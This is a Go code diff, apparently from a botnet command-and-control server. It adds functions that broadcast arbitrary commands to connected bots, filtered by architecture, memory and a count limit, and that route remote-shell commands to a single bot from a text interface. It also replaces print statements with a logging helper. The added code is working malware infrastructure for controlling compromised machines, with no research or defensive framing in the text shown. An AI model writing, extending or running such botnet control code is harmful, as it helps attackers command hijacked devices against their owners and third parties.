+func sendToFilteredBots(command string, archFilter string, minRAM int64, maxBots int) int {
+	botConnsLock.RLock()
+	defer botConnsLock.RUnlock()
+
+	sentCount := 0
+	for _, botConn := range botConnections {
+		if !botConn.authenticated {
+			continue
+		}
+
+		// Apply architecture filter
+		if archFilter != "" && botConn.arch != archFilter {
+			continue
+		}
+
+		// Apply minimum RAM filter
+		if minRAM > 0 && botConn.ram < minRAM {
+			continue
+		}
+
+		// Apply max bots limit
+		if maxBots > 0 && sentCount >= maxBots {
+			break
+		}
+
+		_, err := botConn.conn.Write([]byte(command + "\n"))
+		if err != nil {
+			logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
+			go removeBotConnection(botConn.botID)
+		} else {
+			sentCount++
+		}
+	}
+
+	filterDesc := ""
+	if archFilter != "" {
+		filterDesc += fmt.Sprintf(" arch=%s", archFilter)
+	}
+	if minRAM > 0 {
+		filterDesc += fmt.Sprintf(" minRAM=%dMB", minRAM)
+	}
+	if maxBots > 0 {
+		filterDesc += fmt.Sprintf(" max=%d", maxBots)
+	}
+	if filterDesc == "" {
+		filterDesc = " (no filters)"
+	}
+
+	logMsg("[COMMAND] Sent to %d bots%s: %s", sentCount, filterDesc, command)
+	return sentCount
+}
+
+// sendToSingleBot sends a command to a specific bot by ID (for TUI use)
+// Sets up commandOrigin for TUI shell response routing
+func sendToSingleBot(botID string, command string) bool {
+	botConnsLock.RLock()
+	defer botConnsLock.RUnlock()
+
+	for id, botConn := range botConnections {
+		if id == botID || strings.HasPrefix(id, botID) {
+			if botConn.authenticated {
+				_, err := botConn.conn.Write([]byte(command + "\n"))
+				if err != nil {
+					logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
+					go removeBotConnection(botConn.botID)
+					return false
+				}
+				logMsg("[TUI-SHELL] Sent to bot %s: %s", botConn.botID, command)
+				return true
+			}
+		}
+	}
+	return false
 }
 
 // sendToBot sends a command to a specific bot by ID (full or partial match)
@@ -1391,11 +1464,11 @@ func sendToBot(botID string, command string, userConn net.Conn, c *client) bool 
 
 				_, err := botConn.conn.Write([]byte(command + "\n"))
 				if err != nil {
-					fmt.Printf("[ERROR] Failed to send to bot %s: %v\n", botConn.botID, err)
+					logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
 					go removeBotConnection(botConn.botID)
 					return false
 				}
-				fmt.Printf("[COMMAND] User %s (%s) sent to bot %s: %s\n",
+				logMsg("[COMMAND] User %s (%s) sent to bot %s: %s",
 					c.user.Username, c.getLevelString(), botConn.botID, command)
 				return true
 			}
@@ -1830,7 +1903,7 @@ func handleRequest(conn net.Conn) {
 							continue
 						}
 					}
-					fmt.Printf("Received input: '%s'\n", readString)
+					logMsg("Received input: '%s'", readString)
 					conn.Write([]byte("Invalid command. Type 'help' for available commands.\n\r"))
 				}
 			}
